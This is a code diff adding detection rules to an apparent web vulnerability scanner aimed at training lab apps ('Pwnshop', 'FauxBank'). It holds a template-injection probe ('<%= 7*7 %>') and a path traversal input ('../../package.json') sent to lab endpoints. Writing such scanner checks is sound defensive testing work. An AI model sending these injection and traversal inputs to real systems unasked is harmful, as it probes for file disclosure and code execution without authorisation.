@@ -27071,6 +27071,124 @@ const pwnshopApplyCouponRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function pwnshopEnsureSellerSession(ctx: RuleContext): Promise<string | null> {
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return null;
+  const sellerDoc = await ctx.probe.get(new URL("/register-seller", ctx.origin).toString(), {
+    method: "POST",
+    body: "shop_name=ThugirProbeShop",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  return pwnshopSessionCookieFromDoc(sellerDoc) ?? cookie;
+}
+
+const pwnshopSellerPreviewSstiLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopEnsureSellerSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const previewUrl = new URL("/seller/preview", ctx.origin);
+  previewUrl.searchParams.set("template", "<%= 7*7 %>");
+  const doc = await ctx.probe.get(previewUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/\b49\b/.test(doc.body)) return NEGATIVE;
+  if (!/Storefront Description|seller-card|Seller/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /ejs|template/i.test(doc.body) ? 0.94 : 0.93,
+    evidence: {
+      url: previewUrl.toString(),
+      snippet: doc.body.match(/49[\s\S]{0,80}/)?.[0]?.slice(0, 120) ?? "49",
+      note: "Pwnshop GET /seller/preview?template= passes raw query input to ejs.render() — <%= 7*7 %> evaluates to 49 (PWN-040)"
+    }
+  };
+};
+
+const pwnshopDownloadPathTraversalLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const downloadUrl = new URL("/download", ctx.origin);
+  downloadUrl.searchParams.set("file", "../../package.json");
+  const doc = await ctx.probe.get(downloadUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"name"\s*:\s*"pwnshop-app"/i.test(doc.body)) return NEGATIVE;
+  if (!/"dependencies"\s*:\s*\{/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: downloadUrl.toString(),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Pwnshop GET /download?file=../../package.json returns application package.json via path.join traversal — invoice download path traversal (PWN-038)"
+    }
+  };
+};
+
+const pwnshopSellerPreviewSstiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/seller\/preview/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopSellerPreviewSstiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /seller/preview route scan — template= query evaluates <%= 7*7 %> to 49 via ejs.render() (PWN-040)"
+    }
+  };
+};
+
+const pwnshopDownloadPathTraversalRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/download/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopDownloadPathTraversalLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /download route scan — file=../../package.json returns package.json via path traversal (PWN-038)"
+    }
+  };
+};
+
+const fauxbankLoansRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/loans/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankLoansRequestLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /loans route scan — POST /api/loans creates pending loan visible in GET /api/loans"
+    }
+  };
+};
+
 const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
   const cookie = await pwnshopRegisterAndLoginCookie(ctx);
@@ -37913,6 +38031,11 @@ export const RULES: Record<string, Rule> = {
   pwnshopCouponCategoryBypassLiveOracle,
   pwnshopAvatarUploadRouteLiveOracle,
   pwnshopApplyCouponRouteLiveOracle,
+  pwnshopSellerPreviewSstiLiveOracle,
+  pwnshopDownloadPathTraversalLiveOracle,
+  pwnshopSellerPreviewSstiRouteLiveOracle,
+  pwnshopDownloadPathTraversalRouteLiveOracle,
+  fauxbankLoansRouteLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
